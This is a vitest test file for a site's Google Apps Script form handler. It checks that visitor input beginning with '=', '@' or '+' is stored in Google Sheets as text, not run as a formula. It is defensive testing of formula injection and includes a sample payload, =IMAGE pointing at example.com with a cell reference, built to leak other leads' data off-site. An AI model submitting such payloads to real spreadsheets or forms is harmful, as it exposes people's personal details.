/**
 * Visitor text must never become a formula in the Sheet (security pass, 10 Oct).
 *
 * appendRow treats a string starting with "=" as a formula, and every text
 * field on the site is typed by the public. =IMAGE("https://…"&B2) as a first
 * name would send other leads' details off-site when the tab is opened.
 * safeCell in google-apps-script.js stores such text as text; these run the
 * real doPost against the stubbed runtime.
 */
import { describe, it, expect } from 'vitest';
import { loadGas, Formula } from './helpers/gas-harness';

function post(payload: Record<string, unknown>) {
  const { gas, rowOf } = loadGas<{ doPost: (e: unknown) => { __body: string } }>({
    exports: ['doPost'],
    fetch: () => { throw new Error('doPost must not make HTTP calls'); },
  });
  const res = JSON.parse(gas.doPost({ postData: { contents: JSON.stringify(payload) } }).__body);
  return { res, rowOf };
}

const ATTACK = '=IMAGE("https://example.com/?"&B2)';
const BASE = { lastName: 'Lee', email: 'ava@example.com', phone: '(714) 555-0100', state: 'CA' };

describe('formula-like text is written as text', () => {
  it.each([
    ['the generic Leads tab', { ...BASE, source: 'fha-contact', firstName: ATTACK, message: '@SUM(A1:A9)' }, 'Leads'],
    ['the Debt Consolidation tab', { ...BASE, source: 'DebtConsolidation', firstName: ATTACK }, 'Debt Consolidation'],
    ['a SOURCE_SCHEMAS tab', { ...BASE, source: 'adu', firstName: ATTACK, projectPurpose: '+HYPERLINK("x")' }, 'ADU'],
  ])('on %s', (_name, payload, tab) => {
    const { res, rowOf } = post(payload);
    expect(res.success).toBe(true);
    const row = rowOf(tab);
    // Stored as the text that was typed, exactly; the harness turns any
    // unguarded "=..." into a Formula, as Sheets would.
    expect(row['First Name']).toBe(ATTACK);
    for (const v of Object.values(row)) expect(v).not.toBeInstanceOf(Formula);
  });

  it('leaves ordinary values exactly as they were', () => {
    const { rowOf } = post({ ...BASE, source: 'fha-contact', firstName: 'Ava', phone: '+1 714 555 0100', loanAmount: 392755, message: '-5% down? Is that possible' });
    const row = rowOf('Leads');
    expect(row['First Name']).toBe('Ava');
    expect(row['Phone']).toBe('+1 714 555 0100');
    expect(row['Loan Amount']).toBe(392755);
  });
});
